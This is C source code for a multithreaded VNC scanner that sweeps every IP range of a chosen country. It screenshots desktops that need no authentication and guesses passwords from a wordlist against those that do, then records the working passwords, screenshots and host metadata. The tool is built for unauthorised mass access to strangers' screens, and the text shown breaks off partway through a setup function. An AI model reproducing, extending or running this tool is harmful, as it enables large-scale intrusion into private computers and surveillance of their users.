#include "color_defs.h"
#include "file_utils.h"
#include "misc_utils.h"
#include "network_utils.h"
#include "vncgrab.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <readline/history.h>
#include <readline/readline.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/capability.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>
#define TCP_PORT 5900

// ANSI color codes

/**
 * Prints the program banner to the console.
 *
 * @return Always returns 0.
 */
int print_banner() {
  printf(COLOR_CYAN
         "\n"
         "██╗   ██╗███╗   ██╗ ██████╗███████╗███╗   ██╗ █████╗ ████████╗ "
         "██████╗██╗  ██╗\n"
         "██║   ██║████╗  ██║██╔════╝██╔════╝████╗  "
         "██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║\n"
         "██║   ██║██╔██╗ ██║██║     ███████╗██╔██╗ ██║███████║   ██║   ██║    "
         " ███████║\n"
         "╚██╗ ██╔╝██║╚██╗██║██║     ╚════██║██║╚██╗██║██╔══██║   ██║   ██║    "
         " ██╔══██║\n"
         " ╚████╔╝ ██║ ╚████║╚██████╗███████║██║ ╚████║██║  ██║   ██║   "
         "╚██████╗██║  ██║\n"
         "  ╚═══╝  ╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    "
         "╚═════╝╚═╝  ╚═╝\n"
         "                                                                    "
         " " COLOR_MAGENTA "             by  \n\n" COLOR_RESET);
  return 0;
}

static void print_usage(const char *progname) {
  printf("Usage: %s [options]\n", progname);
  printf("\n");
  printf("Options:\n");
  printf("  -c, --country CODE   Two-letter country code (e.g., DK)\n");
  printf("  -f, --file PATH      IP2Location CSV file path\n");
  printf("  -w, --workers N      Number of worker threads\n");
  printf("  -t, --timeout SEC    Snapshot timeout in seconds (default 60)\n");
  printf("  -p, --ports LIST     Comma-separated VNC ports (default 5900,5901)\n");
  printf("  -r, --resume         Resume from .line checkpoint\n");
  printf("  -R, --rate N         Limit scans to N IPs per second\n");
  printf("  -P, --password PASS  Use PASS for VNC auth (if required)\n");
  printf("  -F, --password-file  Read passwords from file (one per line)\n");
  printf("  -M, --metadata-dir   Output per-host metadata JSON files\n");
  printf("  -A, --allow-cidr     Comma-separated CIDR allowlist\n");
  printf("  -D, --deny-cidr      Comma-separated CIDR denylist\n");
  printf("  -T, --delay-attempts Delay between password attempts (ms)\n");
  printf("  -o, --results PATH   Write results summary to PATH\n");
  printf("  -b, --allowblank     Allow blank (all black) screenshots\n");
  printf("  -B, --ignoreblank    Skip blank (all black) screenshots\n");
  printf("  -Q, --quality N      JPEG quality 1-100 (default 100)\n");
  printf("  -x, --rect SPEC      Capture sub-rect (wxh+x+y)\n");
  printf("  -v, --verbose        Print per-host progress output\n");
  printf("  -q, --quiet          Suppress progress output\n");
  printf("  -h, --help           Show this help message\n");
}

/**
 * Checks if a given command is available in the system's PATH.
 *
 * @param command The name of the command to check.
 * @return 1 if the command is found in the PATH, 0 otherwise.
 */
int is_command_in_path(const char *command) {
  char *path = getenv("PATH");
  if (path == NULL) {
    return 0;
  }

  char *path_dup = strdup(path);
  char *dir = strtok(path_dup, ":");
  while (dir != NULL) {
    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s/%s", dir, command);
    if (access(full_path, X_OK) == 0) {
      free(path_dup);
      return 1;
    }
    dir = strtok(NULL, ":");
  }
  free(path_dup);
  return 0;
}

#ifdef USE_VNCSNAPSHOT
static int run_vncsnapshot(const char *ip_addr, int port, int timeout_sec);
#endif
static int capture_snapshot(const char *ip_addr, int port, int timeout_sec,
                            int verbose, const char *password, int allow_blank,
                            int jpeg_quality, int rect_x, int rect_y,
                            int rect_w, int rect_h);
static int parse_ports(const char *arg, int *ports, size_t max_ports);
static int parse_rect(const char *arg, int *x, int *y, int *w, int *h);

typedef struct {
  char **items;
  size_t count;
} password_list_t;

typedef struct {
  uint32_t network;
  uint32_t mask;
} cidr_t;

typedef struct {
  uint32_t start;
  uint32_t end;
} ip_range_t;

typedef struct {
  ip_range_t *ranges;
  size_t range_count;
  size_t range_index;
  uint32_t current_ip;
  pthread_mutex_t range_mutex;
  uint64_t total_ips;
  uint64_t scanned_ips;
  uint64_t online_hosts;
  uint64_t vnc_found;
  uint64_t vnc_noauth;
  uint64_t auth_attempts;
  uint64_t auth_success;
  uint64_t screenshots;
  int snapshot_timeout;
  int verbose;
  int quiet;
  const password_list_t *passwords;
  int allow_blank;
  int jpeg_quality;
  int rect_x;
  int rect_y;
  int rect_w;
  int rect_h;
  const char *metadata_dir;
  const char *country_code;
  const char *country_name;
  int ping_available;
  int spinner_index;
  int ui_initialized;
  time_t start_time;
  int worker_count;
  struct {
    char label[64];
    int is_vnc;
  } recent_hits[5];
  int recent_hit_count;
  int recent_hit_index;
  const cidr_t *allow_cidrs;
  size_t allow_cidr_count;
  const cidr_t *deny_cidrs;
  size_t deny_cidr_count;
  int auth_delay_ms;
  FILE *results_file;
  int results_jsonl;
  pthread_mutex_t results_mutex;
  int ports[64];
  size_t port_count;
  int resume_enabled;
  uint64_t resume_offset;
  int rate_limit;
  pthread_mutex_t rate_mutex;
  struct timeval last_rate_time;
  pthread_mutex_t checkpoint_mutex;
  struct timeval last_checkpoint;
  pthread_mutex_t stats_mutex;
  pthread_mutex_t print_mutex;
  struct timeval last_print;
} scan_context_t;

static int load_country_ranges(const char *file_location,
                               const char *country_code,
                               ip_range_t **ranges_out,
                               size_t *range_count_out,
                               uint64_t *total_ips_out,
                               char **country_name_out) {
  FILE *file = fopen(file_location, "r");
  char line[1024];
  ip_range_t *ranges = NULL;
  size_t range_count = 0;
  size_t range_capacity = 0;
  uint64_t total_ips = 0;
  char *country_name = NULL;

  if (file == NULL) {
    perror(COLOR_RED "Failed to open CSV file" COLOR_RESET);
    return -1;
  }

  while (fgets(line, sizeof(line), file) != NULL) {
    char start_ip_str[20], end_ip_str[20], csv_country_code[3],
        csv_country_name[50];
    int parsed = sscanf(line, "\"%19[^\"]\",\"%19[^\"]\",\"%2[^\"]\",\"%49[^\"]\"",
                        start_ip_str, end_ip_str, csv_country_code,
                        csv_country_name);
    if (parsed != 4) {
      continue;
    }
    if (strcmp(csv_country_code, country_code) != 0) {
      continue;
    }

    uint32_t start_ip = (uint32_t)strtoul(start_ip_str, NULL, 10);
    uint32_t end_ip = (uint32_t)strtoul(end_ip_str, NULL, 10);
    if (start_ip > end_ip) {
      continue;
    }

    if (!country_name) {
      country_name = strdup(csv_country_name);
    }
    if (range_count == range_capacity) {
      size_t new_capacity = range_capacity == 0 ? 64 : range_capacity * 2;
      ip_range_t *new_ranges =
          realloc(ranges, new_capacity * sizeof(*ranges));
      if (!new_ranges) {
        free(ranges);
        fclose(file);
        return -1;
      }
      ranges = new_ranges;
      range_capacity = new_capacity;
    }
    ranges[range_count].start = start_ip;
    ranges[range_count].end = end_ip;
    range_count++;
    total_ips += (uint64_t)end_ip - (uint64_t)start_ip + 1;
  }

  fclose(file);

  *ranges_out = ranges;
  *range_count_out = range_count;
  *total_ips_out = total_ips;
  if (country_name_out) {
    *country_name_out = country_name;
  } else {
    free(country_name);
  }
  return 0;
}

static int get_worker_count(int override) {
  if (override > 0) {
    return override;
  }
  long cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
  int workers = cpu_count > 0 ? (int)cpu_count * 2 : 4;

  if (workers < 2) {
    workers = 2;
  }
  if (workers > 64) {
    workers = 64;
  }
  return workers;
}

static int parse_ports(const char *arg, int *ports, size_t max_ports) {
  if (!arg || !ports || max_ports == 0) {
    return -1;
  }

  char *copy = strdup(arg);
  if (!copy) {
    return -1;
  }

  size_t count = 0;
  char *token = strtok(copy, ",");
  while (token) {
    if (count >= max_ports) {
      free(copy);
      return -1;
    }
    char *end = NULL;
    long value = strtol(token, &end, 10);
    if (!end || *end != '\0' || value <= 0 || value > 65535) {
      free(copy);
      return -1;
    }
    ports[count++] = (int)value;
    token = strtok(NULL, ",");
  }

  free(copy);
  return count > 0 ? (int)count : -1;
}

static int parse_rect(const char *arg, int *x, int *y, int *w, int *h) {
  if (!arg || !x || !y || !w || !h) {
    return -1;
  }

  int rx = 0;
  int ry = 0;
  int rw = 0;
  int rh = 0;
  if (sscanf(arg, "%dx%d+%d+%d", &rw, &rh, &rx, &ry) != 4) {
    return -1;
  }
  if (rw <= 0 || rh <= 0) {
    return -1;
  }
  *x = rx;
  *y = ry;
  *w = rw;
  *h = rh;
  return 0;
}

static int parse_cidr(const char *arg, cidr_t *out) {
  if (!arg || !out) {
    return -1;
  }

  char buf[64];
  const char *slash = strchr(arg, '/');
  if (!slash) {
    return -1;
  }
  size_t ip_len = (size_t)(slash - arg);
  if (ip_len == 0 || ip_len >= sizeof(buf)) {
    return -1;
  }
  memcpy(buf, arg, ip_len);
  buf[ip_len] = '\0';

  char *end = NULL;
  long prefix = strtol(slash + 1, &end, 10);
  if (!end || *end != '\0' || prefix < 0 || prefix > 32) {
    return -1;
  }

  struct in_addr addr;
  if (inet_pton(AF_INET, buf, &addr) != 1) {
    return -1;
  }
  uint32_t ip = ntohl(addr.s_addr);
  uint32_t mask = prefix == 0 ? 0 : (0xFFFFFFFFu << (32 - prefix));
  out->mask = mask;
  out->network = ip & mask;
  return 0;
}

static int parse_cidr_list(const char *arg, cidr_t **list_out,
                           size_t *count_out) {
  if (!arg || !list_out || !count_out) {
    return -1;
  }

  char *copy = strdup(arg);
  if (!copy) {
    return -1;
  }

  size_t count = 0;
  cidr_t *list = NULL;
  char *token = strtok(copy, ",");
  while (token) {
    cidr_t cidr;
    if (parse_cidr(token, &cidr) != 0) {
      free(list);
      free(copy);
      return -1;
    }
    cidr_t *next = realloc(list, (count + 1) * sizeof(*list));
    if (!next) {
      free(list);
      free(copy);
      return -1;
    }
    list = next;
    list[count++] = cidr;
    token = strtok(NULL, ",");
  }

  free(copy);
  *list_out = list;
  *count_out = count;
  return 0;
}

static int ip_in_cidrs(uint32_t ip, const cidr_t *list, size_t count) {
  for (size_t i = 0; i < count; i++) {
    if ((ip & list[i].mask) == list[i].network) {
      return 1;
    }
  }
  return 0;
}

static void free_password_list(password_list_t *list) {
  if (!list) {
    return;
  }
  for (size_t i = 0; i < list->count; i++) {
    free(list->items[i]);
  }
  free(list->items);
  list->items = NULL;
  list->count = 0;
}

static int add_password(password_list_t *list, const char *value) {
  if (!list || !value || value[0] == '\0') {
    return 0;
  }
  char **next = realloc(list->items, (list->count + 1) * sizeof(*list->items));
  if (!next) {
    return -1;
  }
  list->items = next;
  list->items[list->count] = strdup(value);
  if (!list->items[list->count]) {
    return -1;
  }
  list->count++;
  return 0;
}

static int load_password_file(password_list_t *list, const char *path) {
  FILE *file = fopen(path, "r");
  char line[512];

  if (!file) {
    return -1;
  }

  while (fgets(line, sizeof(line), file)) {
    char *start = line;
    char *end = NULL;
    while (*start && (*start == ' ' || *start == '\t' || *start == '\r' ||
                      *start == '\n')) {
      start++;
    }
    if (*start == '\0' || *start == '#') {
      continue;
    }
    end = start + strlen(start);
    while (end > start && (end[-1] == '\n' || end[-1] == '\r' ||
                           end[-1] == ' ' || end[-1] == '\t')) {
      end--;
    }
    *end = '\0';
    if (add_password(list, start) != 0) {
      fclose(file);
      return -1;
    }
  }

  fclose(file);
  return 0;
}

static void json_escape(FILE *file, const char *value) {
  for (const char *p = value; *p; p++) {
    switch (*p) {
    case '\\':
      fputs("\\\\", file);
      break;
    case '"':
      fputs("\\\"", file);
      break;
    case '\n':
      fputs("\\n", file);
      break;
    case '\r':
      fputs("\\r", file);
      break;
    case '\t':
      fputs("\\t", file);
      break;
    default:
      fputc(*p, file);
      break;
    }
  }
}

static void write_metadata(const scan_context_t *ctx, const char *ip_addr,
                           int port, int vnc_state, int online,
                           int online_known, const char *password_used,
                           int screenshot_ok) {
  if (!ctx->metadata_dir) {
    return;
  }

  char path[256];
  if (snprintf(path, sizeof(path), "%s/%s.json", ctx->metadata_dir, ip_addr) >=
      (int)sizeof(path)) {
    return;
  }

  FILE *file = fopen(path, "w");
  if (!file) {
    return;
  }

  time_t now = time(NULL);

  fputs("{\n", file);
  fprintf(file, "  \"ip\": \"");
  json_escape(file, ip_addr);
  fprintf(file, "\",\n");
  fprintf(file, "  \"port\": %d,\n", port);
  fprintf(file, "  \"country_code\": \"");
  json_escape(file, ctx->country_code ? ctx->country_code : "");
  fprintf(file, "\",\n");
  fprintf(file, "  \"country_name\": \"");
  json_escape(file, ctx->country_name ? ctx->country_name : "");
  fprintf(file, "\",\n");
  if (!online_known) {
    fprintf(file, "  \"online\": null,\n");
  } else {
    fprintf(file, "  \"online\": %s,\n", online ? "true" : "false");
  }
  fprintf(file, "  \"vnc_detected\": %s,\n", vnc_state >= 0 ? "true" : "false");
  fprintf(file, "  \"auth_required\": %s,\n", vnc_state == 0 ? "true" : "false");
  fprintf(file, "  \"auth_success\": %s,\n",
          password_used ? "true" : "false");
  if (password_used) {
    fprintf(file, "  \"password_used\": \"");
    json_escape(file, password_used);
    fprintf(file, "\",\n");
  } else {
    fprintf(file, "  \"password_used\": null,\n");
  }
  fprintf(file, "  \"screenshot_saved\": %s,\n",
          screenshot_ok ? "true" : "false");
  if (screenshot_ok) {
    fprintf(file, "  \"screenshot_path\": \"");
    json_escape(file, ip_addr);
    fprintf(file, ".jpg\",\n");
  } else {
    fprintf(file, "  \"screenshot_path\": null,\n");
  }
  fprintf(file, "  \"timestamp\": %lld\n", (long long)now);
  fputs("}\n", file);

  fclose(file);
}

static void write_results(scan_context_t *ctx, const char *ip_addr, int port,
                          int vnc_state, int online, int online_known,
                          const char *password_used, int screenshot_ok) {
  if (!ctx->results_file) {
    return;
  }

  pthread_mutex_lock(&ctx->results_mutex);
  if (ctx->results_jsonl) {
    fprintf(ctx->results_file, "{\"ip\":\"");
    json_escape(ctx->results_file, ip_addr);
    fprintf(ctx->results_file, "\",\"port\":%d,", port);
    fprintf(ctx->results_file, "\"country_code\":\"");
    json_escape(ctx->results_file, ctx->country_code ? ctx->country_code : "");
    fprintf(ctx->results_file, "\",\"country_name\":\"");
    json_escape(ctx->results_file, ctx->country_name ? ctx->country_name : "");
    fprintf(ctx->results_file, "\",\"online\":");
    if (!online_known) {
      fprintf(ctx->results_file, "null");
    } else {
      fprintf(ctx->results_file, online ? "true" : "false");
    }
    fprintf(ctx->results_file, ",\"auth_required\":%s",
            vnc_state == 0 ? "true" : "false");
    fprintf(ctx->results_file, ",\"auth_success\":%s",
            password_used ? "true" : "false");
    fprintf(ctx->results_file, ",\"password_used\":");
    if (password_used) {
      fprintf(ctx->results_file, "\"");
      json_escape(ctx->results_file, password_used);
      fprintf(ctx->results_file, "\"");
    } else {
      fprintf(ctx->results_file, "null");
    }
    fprintf(ctx->results_file, ",\"screenshot_saved\":%s}\n",
            screenshot_ok ? "true" : "false");
  } else {
    if (!online_known) {
      fprintf(ctx->results_file, "%s,%d,%s,%s,,%s,%s,%s,%s\n",
              ip_addr,
              port,
              ctx->country_code ? ctx->country_code : "",
              ctx->country_name ? ctx->country_name : "",
              vnc_state == 0 ? "true" : "false",
              password_used ? "true" : "false",
              password_used ? password_used : "",
              screenshot_ok ? "true" : "false");
    } else {
      fprintf(ctx->results_file, "%s,%d,%s,%s,%s,%s,%s,%s,%s\n",
              ip_addr,
              port,
              ctx->country_code ? ctx->country_code : "",
              ctx->country_name ? ctx->country_name : "",
              online ? "true" : "false",
              vnc_state == 0 ? "true" : "false",
              password_used ? "true" : "false",
              password_used ? password_used : "",
              screenshot_ok ? "true" : "false");
    }
  }
  fflush(ctx->results_file);
  pthread_mutex_unlock(&ctx->results_mutex);
}

static void record_recent_hit(scan_context_t *ctx, const char *ip_addr,
                              int port, int vnc_state) {
  if (port <= 0) {
    return;
  }
  pthread_mutex_lock(&ctx->print_mutex);
  snprintf(ctx->recent_hits[ctx->recent_hit_index].label,
           sizeof(ctx->recent_hits[ctx->recent_hit_index].label), "%s:%d",
           ip_addr,
           port);
  ctx->recent_hits[ctx->recent_hit_index].is_vnc = vnc_state >= 0;
  ctx->recent_hit_index = (ctx->recent_hit_index + 1) %
                          (int)(sizeof(ctx->recent_hits) /
                                sizeof(ctx->recent_hits[0]));
  if (ctx->recent_hit_count <
      (int)(sizeof(ctx->recent_hits) / sizeof(ctx->recent_hits[0]))) {
    ctx->recent_hit_count++;
  }
  pthread_mutex_unlock(&ctx->print_mutex);
}

static int read_resume_offset(const char *path, uint64_t *offset_out) {
  FILE *file = fopen(path, "r");
  if (!file) {
    return -1;
  }
  unsigned long long value = 0;
  if (fscanf(file, "%llu", &value) != 1) {
    fclose(file);
    return -1;
  }
  fclose(file);
  *offset_out = (uint64_t)value;
  return 0;
}

static void write_resume_offset(const char *path, uint64_t offset) {
  FILE *file = fopen(path, "w");
  if (!file) {
    return;
  }
  fprintf(file, "%llu\n", (unsigned long long)offset);
  fclose(file);
}

static int apply_resume_offset(scan_context_t *ctx) {
  uint64_t offset = ctx->resume_offset;

  if (offset == 0) {
    return 0;
  }

  for (size_t i = 0; i < ctx->range_count; i++) {
    uint64_t range_size = (uint64_t)ctx->ranges[i].end -
                          (uint64_t)ctx->ranges[i].start + 1;
    if (offset < range_size) {
      ctx->range_index = i;
      ctx->current_ip = ctx->ranges[i].start + (uint32_t)offset;
      ctx->scanned_ips = ctx->resume_offset;
      return 0;
    }
    offset -= range_size;
  }

  return -1;
}

static void rate_limit_wait(scan_context_t *ctx) {
  if (ctx->rate_limit <= 0) {
    return;
  }

  long interval_us = 1000000L / ctx->rate_limit;
  struct timeval now;
  struct timeval last;

  pthread_mutex_lock(&ctx->rate_mutex);
  gettimeofday(&now, NULL);
  last = ctx->last_rate_time;
  if (last.tv_sec == 0 && last.tv_usec == 0) {
    ctx->last_rate_time = now;
    pthread_mutex_unlock(&ctx->rate_mutex);
    return;
  }

  long elapsed_us = (now.tv_sec - last.tv_sec) * 1000000L +
                    (now.tv_usec - last.tv_usec);
  if (elapsed_us < interval_us) {
    usleep((useconds_t)(interval_us - elapsed_us));
    gettimeofday(&now, NULL);
  }
  ctx->last_rate_time = now;
  pthread_mutex_unlock(&ctx->rate_mutex);
}

static void checkpoint_update(scan_context_t *ctx, int force) {
  if (!ctx->resume_enabled) {
    return;
  }

  struct timeval now;
  gettimeofday(&now, NULL);

  pthread_mutex_lock(&ctx->checkpoint_mutex);
  long elapsed_ms = (now.tv_sec - ctx->last_checkpoint.tv_sec) * 1000L +
                    (now.tv_usec - ctx->last_checkpoint.tv_usec) / 1000L;
  if (!force && elapsed_ms >= 0 && elapsed_ms < 1000) {
    pthread_mutex_unlock(&ctx->checkpoint_mutex);
    return;
  }

  pthread_mutex_lock(&ctx->stats_mutex);
  uint64_t scanned = ctx->scanned_ips;
  pthread_mutex_unlock(&ctx->stats_mutex);

  write_resume_offset(".line", scanned);
  ctx->last_checkpoint = now;
  pthread_mutex_unlock(&ctx->checkpoint_mutex);
}

static int get_next_ip(scan_context_t *ctx, uint32_t *ip_out) {
  int has_ip = 0;

  pthread_mutex_lock(&ctx->range_mutex);
  if (ctx->range_index < ctx->range_count) {
    *ip_out = ctx->current_ip;
    if (ctx->current_ip == ctx->ranges[ctx->range_index].end) {
      ctx->range_index++;
      if (ctx->range_index < ctx->range_count) {
        ctx->current_ip = ctx->ranges[ctx->range_index].start;
      }
    } else {
      ctx->current_ip++;
    }
    has_ip = 1;
  }
  pthread_mutex_unlock(&ctx->range_mutex);

  return has_ip;
}

static void update_progress(scan_context_t *ctx, int force) {
  if (ctx->quiet || ctx->verbose) {
    return;
  }
  struct timeval now;
  gettimeofday(&now, NULL);

  pthread_mutex_lock(&ctx->print_mutex);
  long elapsed_ms = (now.tv_sec - ctx->last_print.tv_sec) * 1000L +
                    (now.tv_usec - ctx->last_print.tv_usec) / 1000L;
  if (!force && elapsed_ms >= 0 && elapsed_ms < 200) {
    pthread_mutex_unlock(&ctx->print_mutex);
    return;
  }

  pthread_mutex_lock(&ctx->stats_mutex);
  uint64_t scanned = ctx->scanned_ips;
  uint64_t total = ctx->total_ips;
  uint64_t online = ctx->online_hosts;
  uint64_t vnc_found = ctx->vnc_found;
  uint64_t vnc_noauth = ctx->vnc_noauth;
  uint64_t shots = ctx->screenshots;
  uint64_t auth_attempts = ctx->auth_attempts;
  uint64_t auth_success = ctx->auth_success;
  int recent_count = ctx->recent_hit_count;
  int recent_index = ctx->recent_hit_index;
  struct {
    char label[64];
    int is_vnc;
  } recent[5];
  for (int i = 0; i < recent_count; i++) {
    int idx = (recent_index - 1 - i);
    if (idx < 0) {
      idx += (int)(sizeof(ctx->recent_hits) / sizeof(ctx->recent_hits[0]));
    }
    snprintf(recent[i].label, sizeof(recent[i].label), "%s",
             ctx->recent_hits[idx].label);
    recent[i].is_vnc = ctx->recent_hits[idx].is_vnc;
  }
  pthread_mutex_unlock(&ctx->stats_mutex);

  double pct = total ? (double)scanned * 100.0 / (double)total : 0.0;
  static const char spinner[] = "|/-\\";
  char spin = spinner[ctx->spinner_index % 4];
  ctx->spinner_index++;
  time_t now_sec = time(NULL);
  double elapsed = difftime(now_sec, ctx->start_time);
  double rate = elapsed > 0 ? (double)scanned / elapsed : 0.0;
  double eta = rate > 0 ? (double)(total - scanned) / rate : 0.0;
  long eta_sec = eta < 0 ? 0 : (long)eta;
  long days = eta_sec / 86400;
  eta_sec %= 86400;
  long hours = eta_sec / 3600;
  eta_sec %= 3600;
  long minutes = eta_sec / 60;
  long seconds = eta_sec % 60;
  char eta_buf[32];
  if (days > 0) {
    snprintf(eta_buf, sizeof(eta_buf), "%ldd%02ldh", days, hours);
  } else if (hours > 0) {
    snprintf(eta_buf, sizeof(eta_buf), "%ldh%02ldm", hours, minutes);
  } else if (minutes > 0) {
    snprintf(eta_buf, sizeof(eta_buf), "%ldm%02lds", minutes, seconds);
  } else {
    snprintf(eta_buf, sizeof(eta_buf), "%lds", seconds);
  }

  int bar_width = 24;
  int filled = (int)(pct / 100.0 * bar_width);
  if (filled < 0) {
    filled = 0;
  }
  if (filled > bar_width) {
    filled = bar_width;
  }

  if (!ctx->ui_initialized) {
    printf("\n\n");
    ctx->ui_initialized = 1;
  }

  printf("\033[2A");
  printf("\r\033[2K[%c] [", spin);
  for (int i = 0; i < bar_width; i++) {
    putchar(i < filled ? '#' : '-');
  }
  printf("] %5.1f%% %llu/%llu  rate:%5.1f/s  eta:%s  threads:%d\n",
         pct,
         (unsigned long long)scanned,
         (unsigned long long)total,
         rate,
         eta_buf,
         ctx->worker_count);

  if (!ctx->ping_available) {
    printf("\r\033[2Konline:%sn/a%s  vnc:%s%llu%s  noauth:%s%llu%s  auth:%s%llu/%llu%s  shots:%s%llu%s",
           COLOR_YELLOW,
           COLOR_RESET,
           COLOR_BLUE,
           (unsigned long long)vnc_found,
           COLOR_RESET,
           COLOR_GREEN,
           (unsigned long long)vnc_noauth,
           COLOR_RESET,
           COLOR_YELLOW,
           (unsigned long long)auth_success,
           (unsigned long long)auth_attempts,
           COLOR_RESET,
           COLOR_GREEN,
           (unsigned long long)shots,
           COLOR_RESET);
  } else {
    printf("\r\033[2Konline:%s%llu%s  vnc:%s%llu%s  noauth:%s%llu%s  auth:%s%llu/%llu%s  shots:%s%llu%s",
           COLOR_BLUE,
           (unsigned long long)online,
           COLOR_RESET,
           COLOR_BLUE,
           (unsigned long long)vnc_found,
           COLOR_RESET,
           COLOR_GREEN,
           (unsigned long long)vnc_noauth,
           COLOR_RESET,
           COLOR_YELLOW,
           (unsigned long long)auth_success,
           (unsigned long long)auth_attempts,
           COLOR_RESET,
           COLOR_GREEN,
           (unsigned long long)shots,
           COLOR_RESET);
  }

  if (recent_count > 0) {
    printf("  recent:");
    for (int i = 0; i < recent_count; i++) {
      const char *color = recent[i].is_vnc ? COLOR_GREEN : COLOR_RED;
      printf(" %s%s%s", color, recent[i].label, COLOR_RESET);
    }
  }
  printf("\n");
  fflush(stdout);
  ctx->last_print = now;
  pthread_mutex_unlock(&ctx->print_mutex);
}

static void *scan_worker(void *arg) {
  scan_context_t *ctx = arg;
  uint32_t ip;

  while (get_next_ip(ctx, &ip)) {
    char ip_addr[INET_ADDRSTRLEN];
    struct in_addr ip_addr_struct;
    ip_addr_struct.s_addr = htonl(ip);

    if (ctx->allow_cidr_count > 0 &&
        !ip_in_cidrs(ip, ctx->allow_cidrs, ctx->allow_cidr_count)) {
      pthread_mutex_lock(&ctx->stats_mutex);
      ctx->scanned_ips++;
      pthread_mutex_unlock(&ctx->stats_mutex);
      update_progress(ctx, 0);
      checkpoint_update(ctx, 0);
      continue;
    }
    if (ctx->deny_cidr_count > 0 &&
        ip_in_cidrs(ip, ctx->deny_cidrs, ctx->deny_cidr_count)) {
      pthread_mutex_lock(&ctx->stats_mutex);
      ctx->scanned_ips++;
      pthread_mutex_unlock(&ctx->stats_mutex);
      update_progress(ctx, 0);
      checkpoint_update(ctx, 0);
      continue;
    }

    if (!inet_ntop(AF_INET, &ip_addr_struct, ip_addr, sizeof(ip_addr))) {
      pthread_mutex_lock(&ctx->stats_mutex);
      ctx->scanned_ips++;
      pthread_mutex_unlock(&ctx->stats_mutex);
      update_progress(ctx, 0);
      continue;
    }

    if (ctx->verbose) {
      pthread_mutex_lock(&ctx->print_mutex);
      printf("Checking address %s:\n", ip_addr);
      pthread_mutex_unlock(&ctx->print_mutex);
    }

    rate_limit_wait(ctx);

    int online_known = ctx->ping_available != 0;
    int online = online_known ? is_ip_up(ip_addr) : 1;
    int vnc_state = -1;
    int took_shot = 0;
    const char *password_used = NULL;
    int port_used = ctx->port_count > 0 ? ctx->ports[0] : 0;

    if (online) {
      for (size_t i = 0; i < ctx->port_count; i++) {
        port_used = ctx->ports[i];
        vnc_state = get_security(ip_addr, port_used, ctx->verbose != 0);
        if (vnc_state >= 0) {
          break;
        }
      }
      if (vnc_state == 1) {
        if (capture_snapshot(ip_addr, port_used, ctx->snapshot_timeout,
                             ctx->verbose, NULL, ctx->allow_blank,
                             ctx->jpeg_quality, ctx->rect_x, ctx->rect_y,
                             ctx->rect_w, ctx->rect_h) == 0) {
          took_shot = 1;
        }
      } else if (vnc_state == 0 && ctx->passwords &&
                 ctx->passwords->count > 0) {
        for (size_t i = 0; i < ctx->passwords->count; i++) {
          const char *candidate = ctx->passwords->items[i];
          pthread_mutex_lock(&ctx->stats_mutex);
          ctx->auth_attempts++;
          pthread_mutex_unlock(&ctx->stats_mutex);
          if (capture_snapshot(ip_addr, port_used, ctx->snapshot_timeout,
                               ctx->verbose, candidate, ctx->allow_blank,
                               ctx->jpeg_quality, ctx->rect_x, ctx->rect_y,
                               ctx->rect_w, ctx->rect_h) == 0) {
            password_used = candidate;
            took_shot = 1;
            pthread_mutex_lock(&ctx->stats_mutex);
            ctx->auth_success++;
            pthread_mutex_unlock(&ctx->stats_mutex);
            break;
          }
          if (ctx->auth_delay_ms > 0) {
            usleep((useconds_t)ctx->auth_delay_ms * 1000);
          }
        }
      }
    } else if (ctx->verbose && online_known) {
      pthread_mutex_lock(&ctx->print_mutex);
      printf("not online. Skipping!\n");
      pthread_mutex_unlock(&ctx->print_mutex);
    }

    pthread_mutex_lock(&ctx->stats_mutex);
    ctx->scanned_ips++;
    if (online && online_known) {
      ctx->online_hosts++;
    }
    if (vnc_state >= 0) {
      ctx->vnc_found++;
    }
    if (vnc_state == 1) {
      ctx->vnc_noauth++;
    }
    if (took_shot) {
      ctx->screenshots++;
    }
    pthread_mutex_unlock(&ctx->stats_mutex);

    if (online_known && online) {
      record_recent_hit(ctx, ip_addr, port_used, vnc_state);
    }
    if (vnc_state >= 0) {
      write_metadata(ctx, ip_addr, port_used, vnc_state, online, online_known,
                     password_used, took_shot);
      write_results(ctx, ip_addr, port_used, vnc_state, online, online_known,
                    password_used, took_shot);
    }

    update_progress(ctx, 0);
    checkpoint_update(ctx, 0);
  }

  return NULL;
}

/**
 * Parses the CSV file and checks IP addresses within specified ranges.
 *
 * @param file_location The path to the CSV file.
 * @param country_code The country code to filter IP ranges.
 * @return The number of screenshots taken.
 */
int parse_and_check_ips(const char *file_location, const char *country_code,
                        int workers, int snapshot_timeout, int verbose,
                        int quiet, const int *ports, size_t port_count,
                        int resume_enabled, uint64_t resume_offset,
                        int rate_limit, const password_list_t *passwords,
                        int allow_blank, int jpeg_quality, int rect_x,
                        int rect_y, int rect_w, int rect_h,
                        const char *metadata_dir, const cidr_t *allow_cidrs,
                        size_t allow_cidr_count, const cidr_t *deny_cidrs,
                        size_t deny_cidr_count, int auth_delay_ms,
                        FILE *results_file, int results_jsonl) {
  ip_range_t *ranges = NULL;
  size_t range_count = 0;
  uint64_t total_ips = 0;
  char *country_name = NULL;

  if (!quiet) {
    printf("Preparing IP ranges...\n");
  }
  if (load_country_ranges(file_location, country_code, &ranges, &range_count,
                          &total_ips, &country_name) != 0) {
    free(country_name);
    return 0;
  }

  if (range_count == 0) {
    printf(COLOR_YELLOW "No ranges found for country code %s.\n" COLOR_RESET,
           country_code);
    free(ranges);
    free(country_name);
    return 0;
  }

  printf("Country %s: %zu ranges totaling %llu IPs\n",
         country_code,
         range_count,
         (unsigned long long)total_ips);

  scan_context_t ctx;
  memset(&ctx, 0, sizeof(ctx));
  ctx.ranges = ranges;
  ctx.range_count = range_count;
  ctx.range_index = 0;
  ctx.current_ip = ranges[0].start;
  ctx.total_ips = total_ips;
  ctx.snapshot_timeout = snapshot_timeout;
  ctx.verbose = verbose;
  ctx.quiet = quiet;
  ctx.passwords = passwords;
